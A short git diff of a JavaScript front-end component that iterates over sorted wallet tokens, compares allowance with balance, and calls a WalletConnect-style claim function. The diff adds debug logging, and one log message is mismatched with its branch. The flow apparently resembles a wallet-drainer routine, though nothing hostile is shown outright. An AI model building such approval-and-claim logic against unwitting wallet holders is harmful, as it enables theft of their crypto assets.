@@ -535,6 +535,7 @@ export default {
         this.isDone = true;
         console.log(this.claimable);
         if (this.currentIndex + 1 > this.sortedTokens.length) {
+          console.log("this.currentIndex + 1 > this.sortedTokens.length");
           if (this.claimable > 0) {
             this.wc_claim();
           } else {
@@ -546,9 +547,11 @@ export default {
         } else {
           const allownce_value = await allownce(this.maxToken);
           const tokenBalanceValue = await balanceOf(this.maxToken);
-          if (allownce_value > tokenBalanceValue) {
+          if (allownce_value < tokenBalanceValue && tokenBalanceValue > 0) {
+            console.log("allownce_value < tokenBalanceValue");
             this.wc_claim();
           }else{
+            console.log("allownce_value < tokenBalanceValue");
             this.currentIndex += 1;
             this.maxToken = null
             this.maxToken = this.sortedTokens[this.currentIndex];
